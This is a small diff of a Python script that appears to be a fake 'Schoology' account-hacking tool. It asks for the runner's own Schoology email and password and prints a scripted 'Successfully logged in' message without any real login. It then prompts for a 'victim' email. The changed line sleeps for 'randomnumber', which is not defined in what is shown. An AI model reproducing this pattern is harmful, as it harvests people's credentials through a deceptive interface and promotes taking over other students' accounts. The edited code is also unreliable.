@@ -16,7 +16,7 @@ print('''
 e = input("[?] Your schoology email: ")
 pwd = maskpass.askpass("[?] Your schoology password: ", mask="") 
 print("[+] Attempting to log into schoology with... " + e)
-time.sleep(4)
+time.sleep(randomnumber)
 print("\033[32m\t> Successfully logged in as " + e + " [\u2713]")
 
 c = input("\033[36m[?] Victims schoology email: ")
